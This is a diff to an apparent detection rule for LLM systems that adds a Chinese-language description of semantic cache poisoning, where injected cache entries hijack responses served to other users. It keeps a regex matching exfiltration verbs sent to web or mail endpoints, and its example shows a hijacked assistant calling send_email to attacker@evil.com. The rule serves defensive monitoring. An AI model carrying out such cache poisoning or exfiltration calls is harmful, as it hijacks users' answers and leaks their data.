@@ -97,3 +97,16 @@ sql_template: |
         AND match(lower(tool_result), '(forward|send|exfil|upload|post|relay).{0,100}(http|ftp|smtp|webhook)')
       )
     )
+translations:
+  zh-CN:
+    name: "语义缓存投毒检测器"
+    description: |
+      检测语义缓存投毒攻击,攻击者向 LLM 语义缓存基础设施(AWS ElastiCache AI、Azure Semantic Cache、LangChain GPTCache)中注入精心构造的条目,通过嵌入向量键(embedding vector key)碰撞使其他用户收到攻击者预设的响应。CacheAttack(arXiv:2601.23088,2026年1月)在 AWS、Azure 和阿里云部署环境中实现了 86% 的响应劫持成功率。NDSS 2026 论文证实该攻击在三大主要公有云上均可生效。该规则不同于 rp-009(RAG 知识库投毒),后者监控检索内容中的覆盖性语言——本规则检测的是杀伤链金丝雀令牌(kill-chain canary token)传播(arXiv:2603.28013)、缓存注入元数据标记,以及反映被注入 LLM 响应的智能体工具调用。关键区别在于:语义缓存投毒针对的是用户查询与 LLM 之间的服务层缓存,而非 RAG 检索背后的向量存储。v0.2.0:新增 Signal 6(cache_id 传播 + 下游转发/外泄动词),用于捕获攻击者控制的缓存条目携带 `cache_entry_id` 或 `served_from_cache` 字段以跟踪跨用户传播而不带显式投毒标签的规避变体。另在参考文献中新增 promptfoo LMVD-9a07c0f2(2026年1月)。
+
+      References: OWASP LLM01:2025, OWASP LLM02:2025, NDSS 2026, arXiv:2601.23088 (CacheAttack, Jan 2026), arXiv:2603.28013 (Kill-Chain Canaries, MIT/UChicago Mar 2026), promptfoo LMVD-9a07c0f2 (Semantic Cache Collision Hijack) -
+      - https://arxiv.org/abs/2601.23088,
+      - https://www.ndss-symposium.org/ndss-paper/when-cache-poisoning-meets-llm-systems-semantic-cache-poisoning-and-its-countermeasures/,
+      - https://arxiv.org/abs/2603.28013,
+      - https://www.promptfoo.dev/lm-security-db/vuln/semantic-cache-collision-hijack-9a07c0f2,
+      - https://github.com/dequeueing/SemanticCache_Poisoning,
+      Example: tool_result contains "SECRET-A4F2C8" (kill-chain canary propagation token, arXiv:2603.28013) or assistant_message calls "send_email(to='attacker@evil.com')" triggered by cache-hijacked LLM response
